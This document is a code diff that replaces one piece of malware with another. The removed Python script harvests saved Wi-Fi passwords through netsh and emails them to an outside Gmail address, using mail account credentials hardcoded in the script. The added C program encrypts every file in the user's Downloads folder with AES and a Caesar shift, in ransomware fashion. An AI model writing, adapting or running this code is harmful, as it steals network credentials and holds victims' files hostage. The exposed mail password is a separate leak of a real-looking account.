@@ -1,70 +1,161 @@
-import subprocess
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <openssl/evp.h>
+#include <openssl/rand.h>
+#include <dirent.h>
+#include <windows.h>
 
-# Function to retrieve saved Wi-Fi keys using netsh
-def get_wifi_keys():
-    wifi_keys = {}
-    # Run netsh to get list of profiles
-    profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode('utf-8', errors="backslashreplace")
-    profiles = [i.split(":")[1][1:-1] for i in profiles.split("\n") if "All User Profile" in i]
+#define AES_KEY_SIZE 16  // 128-bit key size for AES
+#define BUFFER_SIZE 1024
+#define CAESAR_SHIFT 3  // Caesar Cipher shift
 
-    # For each profile, get the Wi-Fi key (if available)
-    for profile in profiles:
-        try:
-            profile_info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode('utf-8', errors="backslashreplace")
-            # Find the key content from the profile info
-            key = [i.split(":")[1][1:-1] for i in profile_info.split("\n") if "Key Content" in i]
-            if key:
-                wifi_keys[profile] = key[0]
-            else:
-                wifi_keys[profile] = None
-        except subprocess.CalledProcessError:
-            wifi_keys[profile] = None
+// Function to apply AES encryption using OpenSSL's EVP API
+void aes_encrypt(FILE *infile, FILE *outfile, unsigned char *key, unsigned char *iv) {
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    if (!ctx) {
+        perror("EVP_CIPHER_CTX_new failed");
+        return;
+    }
 
-    return wifi_keys
+    // Initialize the AES encryption context
+    if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv) != 1) {
+        perror("EVP_EncryptInit_ex failed");
+        EVP_CIPHER_CTX_free(ctx);
+        return;
+    }
 
-# Function to send an email with the Wi-Fi keys
-def send_email(subject, body, to_email):
-    from_email = "info@infopeklo.cz"  # Your Seznam email address
-    password = "Polik789"  # Your Seznam email password
+    unsigned char inbuf[BUFFER_SIZE], outbuf[BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH];
+    int inlen, outlen;
 
-    # Set up the SMTP server
-    smtp_server = "smtp.seznam.cz"
-    smtp_port = 587
+    // Encrypt the file in chunks
+    while ((inlen = fread(inbuf, 1, BUFFER_SIZE, infile)) > 0) {
+        if (EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen) != 1) {
+            perror("EVP_EncryptUpdate failed");
+            EVP_CIPHER_CTX_free(ctx);
+            return;
+        }
+        fwrite(outbuf, 1, outlen, outfile);
+    }
 
-    # Create the email message
-    message = MIMEMultipart()
-    message["From"] = from_email
-    message["To"] = to_email
-    message["Subject"] = subject
-    message.attach(MIMEText(body, "plain"))
+    if (EVP_EncryptFinal_ex(ctx, outbuf, &outlen) != 1) {
+        perror("EVP_EncryptFinal_ex failed");
+        EVP_CIPHER_CTX_free(ctx);
+        return;
+    }
 
-    try:
-        # Connect to SMTP server and send email
-        server = smtplib.SMTP(smtp_server, smtp_port)
-        server.starttls()
-        server.login(from_email, password)
-        server.sendmail(from_email, to_email, message.as_string())
-        server.quit()
-        print(f"Email sent to {to_email}")
-    except Exception as e:
-        print(f"Error sending email: {e}")
+    fwrite(outbuf, 1, outlen, outfile);
+    EVP_CIPHER_CTX_free(ctx);
+}
 
-# Main function to extract Wi-Fi keys and send them via email
-def main():
-    wifi_keys = get_wifi_keys()
-    if wifi_keys:
-        subject = "Saved Wi-Fi Keys"
-        body = "Here are the saved Wi-Fi keys:\n\n"
-        for profile, key in wifi_keys.items():
-            body += f"Network: {profile}\nPassword: {key if key else 'No password found'}\n\n"
-        
-        # Send the email to your Gmail address
-        send_email(subject, body, "alfikeita@gmail.com")
-    else:
-        print("No Wi-Fi keys found or unable to retrieve.")
+// Caesar Cipher for additional encryption
+void caesar_cipher(FILE *file) {
+    unsigned char buffer[BUFFER_SIZE];
+    size_t bytesRead;
 
-if __name__ == "__main__":
-    main()
+    // Read and apply Caesar Cipher to the file in chunks
+    while ((bytesRead = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
+        for (size_t i = 0; i < bytesRead; i++) {
+            // Encrypt characters (apply Caesar Cipher)
+            if ((buffer[i] >= 'A' && buffer[i] <= 'Z') || (buffer[i] >= 'a' && buffer[i] <= 'z')) {
+                if (buffer[i] >= 'A' && buffer[i] <= 'Z') {
+                    buffer[i] = ((buffer[i] - 'A' + CAESAR_SHIFT) % 26) + 'A';
+                } else if (buffer[i] >= 'a' && buffer[i] <= 'z') {
+                    buffer[i] = ((buffer[i] - 'a' + CAESAR_SHIFT) % 26) + 'a';
+                }
+            }
+        }
+        fwrite(buffer, 1, bytesRead, file);  // Write the modified buffer back
+    }
+}
+
+// Function to get the Downloads folder path from USERPROFILE
+char* get_downloads_folder_path() {
+    char *userProfile = getenv("USERPROFILE");
+    if (userProfile == NULL) {
+        fprintf(stderr, "USERPROFILE environment variable not found.\n");
+        return NULL;
+    }
+
+    // Allocate memory for the full path
+    char *downloadsPath = (char*)malloc(strlen(userProfile) + strlen("\\Downloads") + 1);
+    if (downloadsPath == NULL) {
+        perror("Memory allocation failed");
+        return NULL;
+    }
+
+    // Construct the path to the Downloads folder
+    sprintf(downloadsPath, "%s\\Downloads", userProfile);
+    return downloadsPath;
+}
+
+// Function to encrypt a single file using AES and Caesar Cipher
+void encrypt_file(const char *filepath, unsigned char *key, unsigned char *iv) {
+    FILE *file = fopen(filepath, "r+b");
+    if (file == NULL) {
+        perror("Error opening file");
+        return;
+    }
+
+    // Create an encrypted file with .protected extension
+    char encryptedFilePath[1024];
+    sprintf(encryptedFilePath, "%s.protected", filepath);  // Save with .protected extension
+    FILE *encryptedFile = fopen(encryptedFilePath, "w+b");
+    if (encryptedFile == NULL) {
+        perror("Error opening encrypted file");
+        fclose(file);
+        return;
+    }
+
+    // First apply AES encryption
+    aes_encrypt(file, encryptedFile, key, iv);
+    fclose(file);
+    
+    // Apply Caesar Cipher to the encrypted file
+    fseek(encryptedFile, 0, SEEK_SET);  // Go to the beginning of the encrypted file
+    caesar_cipher(encryptedFile);
+    
+    fclose(encryptedFile);
+    printf("Encrypted file saved as: %s\n", encryptedFilePath);
+}
+
+// Function to scan the Downloads folder and encrypt all files
+void encrypt_files_in_downloads(unsigned char *key, unsigned char *iv) {
+    char *downloadsFolderPath = get_downloads_folder_path();
+    if (downloadsFolderPath == NULL) {
+        return;
+    }
+
+    DIR *dir = opendir(downloadsFolderPath);
+    if (dir == NULL) {
+        perror("Failed to open directory");
+        free(downloadsFolderPath);
+        return;
+    }
+
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        // Skip directories (we only want files)
+        if (entry->d_type == DT_DIR) {
+            continue;
+        }
+
+        // Construct the full file path
+        char filePath[1024];
+        sprintf(filePath, "%s\\%s", downloadsFolderPath, entry->d_name);
+
+        // Encrypt the file
+        encrypt_file(filePath, key, iv);
+    }
+
+    closedir(dir);
+    free(downloadsFolderPath);
+}
+
+int main() {
+    unsigned char aesKey[AES_KEY_SIZE] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F};  // 128-bit AES key
+    unsigned char aesIv[AES_BLOCK_SIZE] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F};  // AES IV (initialization vector)
+
+    encrypt_files_in_downloads(aesKey, aesIv);
+    return 0;
+}
